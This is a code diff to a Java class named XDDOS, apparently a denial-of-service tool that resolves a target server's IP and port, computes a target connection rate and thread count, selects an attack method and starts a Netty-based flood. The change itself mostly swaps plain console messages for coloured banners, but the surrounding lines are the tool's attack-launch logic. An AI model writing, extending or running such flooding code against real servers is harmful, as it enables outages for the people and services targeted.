@@ -66,12 +66,12 @@ public class XDDOS {
       if (!attackRunning) {
          attackRunning = true;
          try {
-            System.out.println("Resolving IP...");
+            System.out.println(GREEN_BOLD+"["+RED_BOLD+"XDDOS"+GREEN_BOLD+"]"+WHITE_BOLD+" Resolving Target IP...");
             ServerAddress sa = ServerAddress.getAddrss(serverhp);
             srvRecord = sa.getIP();
             port = sa.getPort();
             resolved = InetAddress.getByName(srvRecord);
-            System.out.println("Resolved IP: " + resolved.getHostAddress());
+            System.out.println(GREEN_BOLD+"["+WHITE_BOLD+"Resolved IP:"+GREEN_BOLD+"]"+WHITE_BOLD+" "+ resolved.getHostAddress()+"\n"+RESET);
             origIP = serverhp.split(":")[0];
             targetCPS = cpuselect + (int) Math.ceil((double) cpuselect / 100 * (50 + (double) cpuselect / 5000));
             nettyThreads = targetCPS == -1 ? 256 : (int) Math.ceil(6.4E-4D * (double) targetCPS);
@@ -90,8 +90,9 @@ public class XDDOS {
 
          Methods.setupMethods();
          method = Methods.getMethod(methodID);
-      System.out.println("Running method: " + method);
-      NettyBootstrap.start();
+         System.out.println(GREEN_BOLD+"["+WHITE_BOLD+"Running Method:"+GREEN_BOLD+"]"+WHITE_BOLD+" "+ method.toString().split("@")[0]+"\n"+RESET);
+
+         NettyBootstrap.start();
       }
    }
 
